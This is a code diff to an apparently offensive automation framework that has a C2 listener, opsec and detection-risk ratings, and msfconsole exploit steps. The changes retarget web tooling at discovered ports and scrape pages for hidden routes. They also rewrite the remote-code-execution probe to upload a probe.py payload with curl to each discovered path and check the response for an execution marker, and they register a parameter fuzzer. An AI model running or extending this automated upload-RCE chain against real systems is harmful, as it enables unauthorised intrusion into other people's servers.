@@ -19,6 +19,14 @@ from phantom.automation.phone_intel import (
     phone_intel_engine, phone_intel_interp,
 )
 from phantom.automation.guidance.commands import Capability, InputSlot
+# P3: the generative fuzz engine (brain/fuzz) had no capability reaching it;
+# these are the adapter/interpreter/engine that register it below. Imported
+# at module level because the registry is a LITERAL (statements cannot live
+# between its entries).
+from phantom.automation.brain.fuzz.capability import (
+    fuzz_adapter as _fuzz_adapter, fuzz_engine as _fuzz_engine,
+    fuzz_interp as _fuzz_interp,
+)
 from phantom.automation.perception import (
     parse_nmap_ports,
     parse_nmap_os,
@@ -75,6 +83,171 @@ def _has_any_service(labels, requires: str):
 
 
 _WEB_PORTS = {80, 443, 8080, 8081, 8443, 8000, 8888, 3000, 5000, 9090}
+
+# --- web target resolution: discovery-driven, not port-guessed -----------
+# The hardened-target simulation showed the web chain aiming at port 80 on a
+# box whose ONLY web surface is on 8443 (self-signed TLS), so `http_probe`
+# "could not reach" the app the scan had just discovered. A discovered web
+# service is the app we mean; guessing 80 is only the last resort.
+_NON_DEFAULT_HTTPS = {443, 8443, 9443, 10443}
+
+
+def _local_addresses() -> set:
+    """Addresses that mean "this box" (the operator's own machine)."""
+    out = {"", "localhost", "127.0.0.1", "::1", "0.0.0.0"}
+    try:
+        import socket
+        out.add(str(socket.gethostbyname(socket.gethostname())))
+    except Exception:
+        pass
+    return out
+
+
+def _c2_port_blocks(host: str) -> str:
+    """Our C2 listener port, but ONLY when the target IS this box.
+
+    Fuzzing/probing our own listener is absurd, so the rule exists — but it
+    was applied to every target, which made the chosen web port depend on
+    the operator's own configuration: a remote app on 8080 was skipped just
+    because the local C2 happened to listen on 8080.
+    """
+    if (host or "").strip().lower() not in _local_addresses():
+        return ""
+    try:
+        from phantom.utils.network import get_c2_endpoint
+        return str(get_c2_endpoint()[1])
+    except Exception:
+        return ""
+
+
+def _discovered_web_port(wm: WorldModel) -> str:
+    """The port of the web app the scan actually found, or "".
+
+    Preference: a fingerprinted `web_app` port, then a service whose label
+    says http/https (bare or as the wrapped protocol of `ssl/http`) on any
+    port, then a service on a well-known web port. NEVER a port we only
+    assume, and never our own listener on a local target.
+    """
+    try:
+        services = list(wm.find("service"))
+    except Exception:
+        services = []
+    app_ports = []
+    for f in wm.find("web_app"):
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", ""))
+        if p and p not in app_ports:
+            app_ports.append(p)
+    host = _effective_target(wm)
+    blocked = _c2_port_blocks(host)
+    for port in app_ports:
+        if port != blocked:
+            return port
+    for f in services:
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", "") or "")
+        if not p or p == blocked:
+            continue
+        label = str(v.get("service", "")).lower()
+        proto = label.rsplit("/", 1)[-1] if "/" in label else label
+        if proto in ("http", "https", "http-alt", "www") \
+                or proto.startswith("http") or "web" in proto:
+            return p
+    for f in services:
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", "") or "")
+        if p and p != blocked and p.isdigit() and int(p) in _WEB_PORTS:
+            return p
+    return ""
+
+
+def _web_scheme(wm: WorldModel, port: str) -> str:
+    """https when the port or the service label says TLS, else http."""
+    try:
+        port_i = int(port)
+    except (TypeError, ValueError):
+        port_i = 0
+    if port_i in _NON_DEFAULT_HTTPS:
+        return "https"
+    try:
+        for f in wm.find("service"):
+            v = f.value if isinstance(f.value, dict) else {}
+            if str(v.get("port", "")) == str(port):
+                label = str(v.get("service", "")).lower()
+                if label.startswith("ssl") or "https" in label \
+                        or label.endswith("/http") and label.startswith("ssl"):
+                    return "https"
+    except Exception:
+        pass
+    return "https" if port_i == 443 else "http"
+
+
+def _preferred_url(wm: WorldModel) -> str:
+    """`_effective_url`, but pointed at the DISCOVERED web app.
+
+    A URL target keeps its own scheme/port/path (the operator was explicit).
+    A bare host with a discovered web service on a non-default port is
+    re-pointed at it: the app the scan found is the app HTTP tooling means.
+    """
+    raw = (_resolve_target_address(wm) or "").strip()
+    if "://" in raw:
+        return _effective_url(wm)
+    port = _discovered_web_port(wm)
+    host = _bare_host(raw)
+    if not host or not port or port in ("80", "443"):
+        return _effective_url(wm)
+    return f"{_web_scheme(wm, port)}://{host}:{port}"
+
+
+# Attribute -> served path. ONE page/script, parsed for the routes it names:
+# the app's own links are the cheapest honest wordlist (the hardened target
+# leaked its hidden RCE path as <script src="/internal/v2/_dash.js">).
+_WEB_PATH_ATTR_RE = re.compile(
+    r"(?:src|href|action|data-url|data-endpoint|data-api)\s*=\s*[\"']"
+    r"([^\"'<>\s]{2,180})[\"']", re.I)
+_DEFAULT_UPLOAD_PATHS = ("/upload",)
+
+
+def _candidate_web_paths(body: str, limit: int = 8):
+    """[(path, evidence)] for the paths this document/script references.
+
+    Deterministic, bounded, dedupe-by-path. Both the raw reference and the
+    extension-less sibling are kept (`/x/dash.js` -> `/x/dash`) because an
+    upload handler is as likely to be addressed with or without the suffix.
+    """
+    import re as _re
+    out = []
+    seen = set()
+    if not isinstance(body, str):
+        return out
+    for m in _WEB_PATH_ATTR_RE.finditer(body[:200000]):
+        ref = m.group(1).strip()
+        if not ref or ref.startswith(("data:", "javascript:", "mailto:", "#")):
+            continue
+        if ref.startswith("http") or "://" in ref:
+            try:
+                from urllib.parse import urlsplit
+                parts = urlsplit(ref)
+                ref = parts.path or ""
+            except ValueError:
+                continue
+        if not ref.startswith("/"):
+            continue
+        ref = ref.split("?", 1)[0].split("#", 1)[0]
+        if not ref or ref == "/":
+            continue
+        variants = [ref]
+        for suffix in (".js", ".css", ".json", ".html"):
+            if ref.lower().endswith(suffix) and len(ref) > len(suffix) + 1:
+                variants.append(ref[: -len(suffix)])
+        for candidate in variants:
+            if len(candidate) > 180 or candidate in seen:
+                continue
+            seen.add(candidate)
+            out.append((candidate, f"referenced by the app: {m.group(0)[:120]}"))
+            if len(out) >= limit:
+                return out
+    return out
 
 
 def _has_web_service():
@@ -1393,7 +1566,8 @@ def _os_adapter(wm, slots):
 
 
 def _http_probe_adapter(wm, slots):
-    url = slots.get("url") or _effective_url(wm)
+    # the DISCOVERED web app, not a guessed port 80
+    url = slots.get("url") or _preferred_url(wm)
     tool = _chosen_tool(wm, "http_probe", "curl")
     if tool == "httpx":
         # httpx is preferred when installed (concurrent prober); the
@@ -1403,11 +1577,43 @@ def _http_probe_adapter(wm, slots):
 
 
 def _http_get_adapter(wm, slots):
-    url = slots.get("url") or _effective_url(wm)
+    url = slots.get("url") or _preferred_url(wm)
     tool = _chosen_tool(wm, "http_get", "curl")
     if tool == "wget":
         return f"wget -q -T 15 -O - {url}"
     return f"curl -s -m 15 {url}"
+
+
+def _http_get_interp(output: str, wm: WorldModel,
+                     slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: the fetched page/script NAMES the app's own paths.
+
+    P0: the web chain used to probe one hardcoded upload path, so an app
+    that hides its handler at a non-standard route (the hardened-target
+    simulation's `/internal/v2/_dash`) was unreachable by the planner while
+    a human reading the page would find it in seconds. Every reference the
+    document serves becomes a `web_path` finding with its evidence, so the
+    discovery is auditable, reusable (hunt/fuzz consume the same fact) and
+    ordered by the planner instead of hardcoded in a command.
+    """
+    findings: List[Finding] = []
+    if not isinstance(output, str) or not output.strip():
+        return findings
+    findings.append(Finding(
+        kind="web_content", key=f"web_content:{wm.target}",
+        value={"bytes": len(output), "host": _effective_target(wm)},
+        confidence=0.6, source="http_get",
+        evidence=output.strip()[:160], target=wm.target))
+    for path, evidence in _candidate_web_paths(output):
+        findings.append(Finding(
+            kind="web_path", key=f"web_path:{path}",
+            value={"path": path, "host": _effective_target(wm),
+                   "evidence": evidence},
+            # a referenced route is a CANDIDATE, never a confirmed endpoint:
+            # a 404 on the probe is the answer, not a contradiction
+            confidence=0.5, source="http_get",
+            evidence=evidence[:200], target=wm.target))
+    return findings
 
 
 _CURL_PROBE_PORTS = (21, 22, 25, 80, 110, 143, 443, 587, 8080, 8443)
@@ -2032,12 +2238,7 @@ def _web_service_target(wm):
     app_ports = {str(v.get("port", "")) for f in wm.find("web_app")
                  if isinstance(f.value, dict)
                  for v in [f.value]}
-    c2_port = None
-    try:
-        from phantom.utils.network import get_c2_endpoint
-        c2_port = str(get_c2_endpoint()[1])
-    except Exception:
-        pass
+    c2_port = _c2_port_blocks(host) or None
     web_ports = {str(p) for p in _WEB_PORTS}
     for f in wm.find("service"):
         v = f.value if isinstance(f.value, dict) else {}
@@ -2073,8 +2274,30 @@ def _web_rce_adapter(wm, slots):
         tf.write(payload)
         tmp = tf.name
     scheme = "https" if port in ("443", "8443") else "http"
-    return (f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
-            f"{scheme}://{target}:{port}/upload | grep -o '{marker}:[0-9]*'")
+    # P0: probe the paths the app ITSELF references (web_path findings from
+    # http_get) plus the conventional default. One bounded request each, so
+    # the probe still costs what it always cost; it just stops assuming that
+    # every upload handler lives at /upload.
+    paths = []
+    try:
+        for f in wm.find("web_path"):
+            v = f.value if isinstance(f.value, dict) else {}
+            p = str(v.get("path", "") or "").strip()
+            if p.startswith("/") and p not in paths:
+                paths.append(p)
+    except Exception:
+        paths = []
+    for p in _DEFAULT_UPLOAD_PATHS:
+        if p not in paths:
+            paths.append(p)
+    segments = []
+    for p in paths[:6]:
+        segments.append(
+            f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
+            f"{scheme}://{target}:{port}{p} | grep -o '{marker}:[0-9]*'")
+    probes = " ; ".join(segments)
+    tried = " ".join(f"{scheme}://{target}:{port}{p}" for p in paths[:6])
+    return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
 
 
 def _web_rce_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
@@ -3738,6 +3961,25 @@ CAPABILITIES = [
         preconditions=[_has_network_host(), _has_finding("service")],
         banner="version-matched exploit", tools=["msfconsole"]),
 
+    # P3: the generative fuzz engine (brain/fuzz) already existed but NO
+    # capability ever invoked it, so its differential-oracle findings never
+    # reached the chain. Registered as an in-process hunting move beside
+    # `hunt_web`: same declared effect (hunt_anomaly), a different technique
+    # (generative mutation of the parameters the target actually has).
+    _mk("fuzz_params", "hunt",
+        "Generative parameter fuzzing: baseline every parameter the target "
+        "actually exposes, seed grammar-driven mutations, keep what the "
+        "differential oracle flags, evolve it, and reproduce before calling "
+        "anything confirmed — bounded rounds/requests, no LLM",
+        [_mk_slot("params", "str", False, "parameters (default: discovered)"),
+         _mk_slot("port", "port", False, "web port (default: discovered)")],
+        ["hunt_anomaly"], _fuzz_adapter, _fuzz_interp, engine=_fuzz_engine,
+        exec_class="in_process_engine",
+        opsec_cost=1.0, detection_risk=0.25, stealth_level="active",
+        forceful=True, timeout=120,
+        preconditions=[_has_web_service()],
+        banner="generative parameter fuzzing", tools=["curl"]),
+
     _mk("hunt_web", "hunt",
         "Behavioural bug-class hunting: endpoint discovery (robots.txt, "
         "sitemap.xml, homepage crawl, common paths), baseline + statistical "
@@ -3852,7 +4094,7 @@ CAPABILITIES = [
 
     _mk("http_get", "recon", "Fetch HTTP page content",
         [_mk_slot("url", "url", True, "full URL")],
-        ["web_content"], _http_get_adapter, None,
+        ["web_content", "web_path"], _http_get_adapter, _http_get_interp,
         opsec_cost=0.5, detection_risk=0.1, stealth_level="passive", timeout=30,
         preconditions=[_has_network_host()], banner="http get",
         tools=["curl", "wget"]),
